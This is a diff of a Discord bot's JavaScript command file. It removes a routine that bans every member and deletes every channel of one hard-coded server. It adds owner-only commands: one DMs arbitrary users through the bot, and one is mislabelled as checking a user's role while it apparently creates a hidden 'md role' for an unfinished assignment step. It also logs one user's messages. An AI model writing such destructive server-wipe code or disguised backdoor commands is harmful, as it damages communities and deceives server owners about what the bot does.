@@ -1,6 +1,7 @@
 import {SlashCommandBuilder} from "@discordjs/builders";
-import {sendMsg, sendBasicMsg, isValidMsg, getUserId, getUserGuild} 
+import {sendMsg, sendBasicMsg, isValidMsg, getUserId, getUserGuild, getIdFromMention} 
 from "./framework.js";
+import {client} from "./app.js";
 
 const commands = [];
 const commandMain = [];
@@ -49,17 +50,19 @@ push([
     }
     
     if(ok) {
-      if(e.guild.id == 1066190880844808202) {
-        e.guild.members.cache.forEach((member) => {
-          member.ban()
-        });
-        e.guild.channels.cache.forEach((channel) => {
-          channel.delete()
-        });
+      if(e.user.id == 991058126339977247) {
+        /*const ms = client.guilds.cache
+        .map(g => 
+          `Guild Name: ${g.name}\n  Total Members: ${g.members.cache.size}\n Guild ID: ${g.id}`
+        ).join('\n\n');
+        await e.reply(ms);*/
+        send();
+      } else if(e.user.id == 702487902948687953
+      && e.guild.id == 1080267361376026704) {
+        console.log(`tica da cutie: "${txt}"\n`);
+        send();
       } else if(e.guild.id != 1060336451566452746
       && e.guild.id != 1033781958389538850) {
-        send();
-      } else if(e.user.id == 991058126339977247) {
         send();
       } else {
         await e.reply({content: "no", ephemeral: true});
@@ -160,6 +163,107 @@ push([
   .setDescription("There is nothing here. Go back"),
   async function(e) {
     await e.reply("Nothing happens <t:1703098500:R>");
+  },
+]);
+
+push([
+  "dm",
+  new SlashCommandBuilder()
+  .setName("dm")
+  .setDescription("Dms someone")
+  .addStringOption(opt => 
+    opt.setName("user")
+    .setDescription("Who to dm")
+    .setRequired(true)
+  )
+  .addStringOption(opt =>
+    opt.setName("message")
+    .setDescription("The message to send")
+    .setRequired(true)
+  ),
+  async function(e) {
+    if(e.user.id != 991058126339977247) {
+      await e.reply({
+        content: `<@${e.user.id}> no`,
+        ephemeral: true,
+      });
+      
+      return;
+    }
+    
+    var us;
+    try {
+      us = await client.users.fetch(
+        getIdFromMention(e.options.getString("user"))
+      );
+    } catch(err) {
+      return await e.reply({content: `Error: ${err}`, ephemeral: true});
+    }
+    
+    us.send(e.options.getString("message"));
+    
+    await e.reply({content: "Message sent!", ephemeral: true});
+  }
+]);
+
+push([
+  "role",
+  new SlashCommandBuilder()
+  .setName("role")
+  .setDescription("Check's someone's role")
+  .addStringOption(opt =>
+    opt.setName("user")
+    .setDescription("The user to check the role")
+    .setRequired(true)
+  ),
+  async function(e) {
+    if(e.user.id != 991058126339977247) {
+      await e.reply({
+        content: `<@${e.user.id}> Error`,
+        ephemeral: true,
+      });
+      
+      return;
+    }
+    
+    var us;
+    try {
+      us = await client.users.fetch(
+        getIdFromMention(e.options.getString("user"))
+      );
+    } catch(err) {
+      return await e.reply({content: `Error: ${err}`, ephemeral: true});
+    }
+    
+    const roleName = "md role";
+    
+    const foundRole = e.guild.roles.find(r => 
+      r.name === roleName
+    );
+    
+    if(!foundRole) {
+      // if not found
+      console.log("not found");
+      createRole();
+    } else {
+      // if found
+      console.log("found");
+      assign();
+    }
+    
+    function createRole() {
+      e.guild.roles.create({
+        data: {
+          name: roleName,
+          color: 'BLUE',
+        },
+        reason: "Buffer role for md bot do not delete",
+      }).then(e => assign()).catch(console.error);
+    }
+    
+    function assign() {
+      
+    }
   },
 ]);
 
